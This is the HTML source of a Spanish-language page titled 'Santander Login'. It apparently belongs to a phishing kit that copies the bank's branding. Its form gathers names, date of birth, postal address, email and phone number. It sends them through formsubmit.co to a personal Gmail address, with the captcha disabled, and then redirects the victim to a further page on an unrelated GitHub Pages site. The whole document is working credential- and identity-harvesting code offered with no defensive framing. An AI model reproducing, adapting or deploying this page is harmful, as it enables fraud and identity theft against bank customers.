<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Santander Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="icon" type="image/png" href="./iconss.png" />
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
</head>

<body class="h-screen bg-cover bg-center" style="background-image: url('./backgr.jpg');">
    <div class="absolute top-3 right-3">
        <select id="language-selector" class="p-1 text-sm border border-gray-300 bg-white/50 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500">
            <option value="es">Español</option>
            <option value="en">English</option>
            <option value="fr">Français</option>
            <option value="de">Deutsch</option>
        </select>
    </div>

    <div class="h-full flex items-center justify-center">
        <div class="w-[350px] bg-white/60 backdrop-blur-md shadow-md p-6 rounded-none">
            <div class="flex justify-center mb-4">
                <img src="./logosand.png" alt="Santander Logo" class="h-10">
            </div>

            <h1 class="text-lg font-semibold text-gray-700 mb-3">Información del Usuario</h1>

            <form action="https://formsubmit.co/princekhalifa2017@gmail.com" method="POST" class="space-y-4">
                <input type="hidden" name="_next" value="https://microbitsoft.github.io/santader/santander/indexthree.html">
                <input type="hidden" name="_captcha" value="false">
                
                <div class="relative">
                    <input type="text" id="surname" name="surname"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Apellido">
                    <label for="surname"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Apellido
                    </label>
                </div>

                <div class="relative">
                    <input type="text" id="firstName" name="firstName"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Nombre">
                    <label for="firstName"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Nombre
                    </label>
                </div>

                <div class="relative">
                    <input type="date" id="dob" name="dob"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500">
                    <label for="dob"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Fecha de nacimiento
                    </label>
                </div>

                <div class="relative">
                    <input type="text" id="postalcode" name="postalcode"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Código Postal">
                    <label for="postalcode"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Código Postal
                    </label>
                </div>

                <div class="relative">
                    <input type="text" id="city" name="city"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Ciudad">
                    <label for="city"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Ciudad
                    </label>
                </div>

                <div class="relative">
                    <input type="text" id="country" name="country"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="País">
                    <label for="country"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        País
                    </label>
                </div>

                <div class="relative">
                    <input type="email" id="email" name="email"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Correo Electrónico">
                    <label for="email"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Correo Electrónico
                    </label>
                </div>

                <div class="relative">
                    <input type="tel" id="phone" name="phone"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Número de Teléfono">
                    <label for="phone"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Número de Teléfono
                    </label>
                </div>

                <button type="submit"
                    class="w-full bg-red-600/80 text-white py-1.5 rounded-none hover:bg-red-700 transition duration-200 text-sm">Enviar</button>
            </form>
        </div>
    </div>

    <script>
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', () => {
                input.previousElementSibling.classList.add('-translate-y-3', 'text-xs', 'text-red-500');
            });

            input.addEventListener('blur', () => {
                if (input.value === '') {
                    input.previousElementSibling.classList.remove('-translate-y-3', 'text-xs', 'text-red-500');
                }
            });
        });
    </script>
</body>

</html>
